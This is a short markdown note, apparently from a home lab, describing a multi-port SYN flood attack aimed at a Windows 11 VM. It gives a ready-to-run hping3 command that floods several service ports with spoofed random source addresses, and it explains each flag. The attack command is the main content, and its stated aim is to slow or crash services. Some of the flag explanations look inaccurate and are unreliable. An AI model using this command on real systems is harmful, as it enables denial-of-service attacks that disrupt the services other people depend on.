# Multi-Port SYN Flood Attack (Random Source IPs)

## Effects:
- High CPU, RAM, and Network (Ethernet) Usage on Windows 11 VM.
- Can slow down or crash network services like RDP, SMB, DNS, and Web Server.
- The Windows 11 VM may crash or freeze due to high processing load.

## Command:
```bash
sudo hping3 -S --flood --rand-source -p 80,443,3389,445,22,53 -d 3000000 --fast <Target IP>
```

## Explanation:

- `-S` → Sends SYN flag, initiating TCP handshake flood.
- `--flood` → Sends continuous packets without waiting for a response.
- `--rand-source` → Uses random fake IPs to bypass filtering.
- `-p 80,443,3389,445,22,53` → Targets multiple ports.
- `-d (ex:-3000000)` → Defines data packet size in KB.
- `--fast` → Sends packets at maximum speed.
